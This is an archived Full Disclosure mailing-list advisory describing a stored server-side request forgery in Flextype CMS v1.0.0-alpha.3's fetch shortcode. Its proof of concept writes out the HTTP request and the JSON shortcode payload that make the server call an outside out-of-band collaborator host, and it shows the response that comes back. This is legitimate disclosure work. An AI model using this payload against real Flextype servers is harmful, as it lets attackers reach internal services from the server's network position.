---
title: Flextype v1.0.0-alpha.3 Stored Fetch Shortcode Allows Server-Side Request Forgery
url: https://seclists.org/fulldisclosure/2026/Sep/26
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:31.957546
---

# Flextype v1.0.0-alpha.3 Stored Fetch Shortcode Allows Server-Side Request Forgery

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](25)
[By Date](date.html#26)
[![Next](/images/right-icon-16x16.png)](27)

[![Previous](/images/left-icon-16x16.png)](25)
[By Thread](index.html#26)
[![Next](/images/right-icon-16x16.png)](27)

![](/shared/images/nst-icons.svg#search)

# Flextype v1.0.0-alpha.3 Stored Fetch Shortcode Allows Server-Side Request Forgery

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 30 Aug 2026 22:57:01 -0400

---

```
Description

Flextype CMS v1.0.0-alpha.3 contains a stored server-side request forgery
(SSRF) vulnerability in its shortcode-processing functionality.

Attacker-controlled entry fields can be automatically processed by
Flextype's shortcode parser. The built-in fetch shortcode accepts an
attacker-controlled resource and passes the resulting value to the
server-side fetch() helper without sufficient destination restrictions.

An attacker capable of creating or modifying an entry can therefore persist
a fetch shortcode that causes Flextype to initiate an HTTP request from the
server when the entry is processed.

Testing confirmed that an attacker-controlled external destination was
contacted and that the destination's HTTP response was returned through the
processed entry. Subsequent normal retrieval of the stored entry caused the
server-side request to occur again.
Impact

An attacker can persist server-side HTTP requests that are executed from
the network context of the Flextype server.

Depending on network configuration, this may provide access to HTTP
services that are inaccessible from the attacker's network position,
including loopback and internal network resources.

Because the destination response is returned through the processed entry,
the vulnerability provides non-blind SSRF.

This vulnerability is distinct from SSRF through /api/v1/query because the
affected execution path uses stored entry content processed through
ShortcodesDirective and FetchShortcode, rather than direct expression
evaluation through the Query API.
DetailsAttacker-Controlled Fetch Resource

FetchShortcode.php obtains the resource from shortcode parameters:

// Get the resource parameter.
$resource = parsers()->shortcodes()->parse($params['resource']);

The resulting attacker-controlled resource is supplied to the server-side
fetch helper:

// Do fetch the data from the resource.
$result = fetch($resource, $options);

Proof of Concept

An entry containing an attacker-controlled fetch shortcode was created:

POST /api/v1/entries HTTP/1.1
Host: 127.0.0.1:18086
Content-Type: application/json

{"token":"lab-token","access_token":"password","id":"shortcode-ssrf-proof","data":{"title":"(fetch:'http://042a59uugt4xtbocdx9ovyusvj1ap4dt.oastify.com';)"}}

Flextype returned the destination's HTTP response:

{
  "reasonPhrase": "OK",
  "statusCode": 200,
  "headers": {
    "Server": [
      "Burp Collaborator https://burpcollaborator.net/";
    ],
    "X-Collaborator-Version": [
      "4"
    ],
    "Content-Type": [
      "text/html"
    ],
    "Content-Length": [
      "55"
    ]
  },
  "body": "<html><body>2trzdergwz6ntzdoje2rmtzjjgmgz</body></html>"
}

The entry was subsequently retrieved:

GET /api/v1/entries?token=lab-token&id=shortcode-ssrf-proof HTTP/1.1
Host: 127.0.0.1:18086

The resulting entry again contained the response obtained from the
attacker-controlled destination.

This demonstrates that the server-side request originates from stored
shortcode content and can be triggered during subsequent entry processing.
Root Cause

The vulnerability occurs because remotely controllable stored entry data is
processed as shortcode syntax and FetchShortcode permits the shortcode to
select a server-side network destination.

The resulting resource is passed directly to:

$result = fetch($resource, $options);

without sufficient restrictions preventing requests to attacker-controlled
or security-sensitive destinations.

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](25)
[By Date](date.html#26)
[![Next](/images/right-icon-16x16.png)](27)

[![Previous](/images/left-icon-16x16.png)](25)
[By Thread](index.html#26)
[![Next](/images/right-icon-16x16.png)](27)

### Current thread:

* **Flextype v1.0.0-alpha.3 Stored Fetch Shortcode Allows Server-Side Request Forgery** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")